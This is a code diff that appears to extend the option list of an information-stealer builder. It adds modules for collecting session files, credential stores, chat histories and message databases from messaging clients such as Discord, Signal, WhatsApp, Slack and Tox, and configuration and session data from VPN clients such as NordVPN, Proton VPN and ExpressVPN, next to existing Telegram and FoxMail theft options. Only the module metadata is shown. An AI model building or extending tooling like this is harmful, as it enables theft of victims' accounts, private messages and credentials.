@@ -111,6 +111,91 @@
                         description: 'Collect Telegram Desktop tdata session files.'
                 },
                 {
+                        id: 'pidgin-data',
+                        label: 'Pidgin profiles',
+                        description: 'Capture Pidgin .purple accounts, chat logs, and configuration.'
+                },
+                {
+                        id: 'psi-data',
+                        label: 'Psi / Psi+ profiles',
+                        description: 'Collect Psi and Psi+ configuration, history, and credential stores.'
+                },
+                {
+                        id: 'discord-data',
+                        label: 'Discord data',
+                        description: 'Archive Discord application data for stable, PTB, and Canary builds.'
+                },
+                {
+                        id: 'slack-data',
+                        label: 'Slack data',
+                        description: 'Gather Slack desktop workspace caches and local session data.'
+                },
+                {
+                        id: 'element-data',
+                        label: 'Element / Riot data',
+                        description: 'Collect Element and Riot Matrix client profiles and caches.'
+                },
+                {
+                        id: 'icq-data',
+                        label: 'ICQ data',
+                        description: 'Capture ICQ desktop client application data and logs.'
+                },
+                {
+                        id: 'signal-data',
+                        label: 'Signal Desktop data',
+                        description: 'Archive Signal Desktop profiles, configuration, and message caches.'
+                },
+                {
+                        id: 'viber-data',
+                        label: 'Viber data',
+                        description: 'Collect Viber desktop profile stores and attachments.'
+                },
+                {
+                        id: 'whatsapp-data',
+                        label: 'WhatsApp Desktop data',
+                        description: 'Gather WhatsApp Desktop caches, databases, and configuration.'
+                },
+                {
+                        id: 'skype-data',
+                        label: 'Skype data',
+                        description: 'Capture Skype and Skype for Desktop profiles, caches, and history.'
+                },
+                {
+                        id: 'tox-data',
+                        label: 'Tox data',
+                        description: 'Collect Tox profile directories and encrypted identity files.'
+                },
+                {
+                        id: 'nordvpn-data',
+                        label: 'NordVPN data',
+                        description: 'Gather NordVPN application state, profiles, and diagnostic logs.'
+                },
+                {
+                        id: 'openvpn-data',
+                        label: 'OpenVPN data',
+                        description: 'Collect OpenVPN and OpenVPN Connect configuration and profiles.'
+                },
+                {
+                        id: 'protonvpn-data',
+                        label: 'Proton VPN data',
+                        description: 'Archive Proton VPN desktop caches, configuration, and session data.'
+                },
+                {
+                        id: 'surfshark-data',
+                        label: 'Surfshark VPN data',
+                        description: 'Gather Surfshark VPN desktop configuration and local storage.'
+                },
+                {
+                        id: 'expressvpn-data',
+                        label: 'ExpressVPN data',
+                        description: 'Collect ExpressVPN desktop profiles, diagnostics, and cached configs.'
+                },
+                {
+                        id: 'cyberghost-data',
+                        label: 'CyberGhost VPN data',
+                        description: 'Capture CyberGhost VPN application data, settings, and logs.'
+                },
+                {
                         id: 'foxmail-data',
                         label: 'FoxMail data',
                         description: 'Gather FoxMail profile stores and account data.'
